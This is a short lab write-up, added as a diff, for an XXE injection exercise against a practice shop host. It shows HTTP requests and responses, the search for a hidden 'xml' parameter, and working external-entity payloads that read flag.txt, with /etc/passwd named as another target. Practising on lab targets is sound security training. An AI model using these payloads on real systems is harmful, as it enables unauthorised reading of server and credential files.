@@ -1,0 +1,85 @@
+XXE injection
+-------------
+
+XXE injection starts with response json (or) xml
+
+Response
+--------
+HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Wed, 06 Mar 2024 06:39:36 GMT
+Content-Type: application/json
+Connection: close
+Content-Length: 41
+
+{"id":1,"name":"Hoodie + Tee","stock":56}
+
+Change the request method (GET --> POST)
+-----------------------------------------
+Reponse is changed .
+
+Connection: close
+Content-Length: 26
+
+["Missing header X-Token"]
+
+
+So, we noticed we have to send xml injection with POST method, first thing we need hidden parameter(xml)
+---------------------------------------------------------------------------------------------------------
+
+We can bruteforce the parameter with turbo intruder(very fast) only in burpsuite business version, community version don't have.
+We found xml parameter.
+
+Resquest
+--------
+
+POST /product/1?xml HTTP/1.1
+Host: stock.nahamstore.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: 
+
+Response
+--------
+
+<?xml version="1.0"?>
+<data><error>Invalid XML supplied</error></data>
+
+We send XML with post method
+----------------------------
+
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 123
+
+<?xml version="1.0"?>
+<data>
+	<error>
+		HI
+	<error>
+</data>
+
+Still ["Missing header X-Token"]
+
+So, we finally put XML injection with X-Token tag
+-------------------------------------------------
+
+
+<?xml version="1.0"?>
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+<data>
+	<X-Token>
+		&example;
+	</X-Token>
+</data>
+
+Finally, we see the word Doe in http response.
+
+We can read flag.txt file or /etc/passwd file. 
+---------------------------------------------
+
+<?xml version="1.0"?>
+<!DOCTYPE replace [<!ENTITY file SYSTEM "file:///flag.txt">]>
+<data>
+	<X-Token>
+		&file;
+	</X-Token>
+</data>
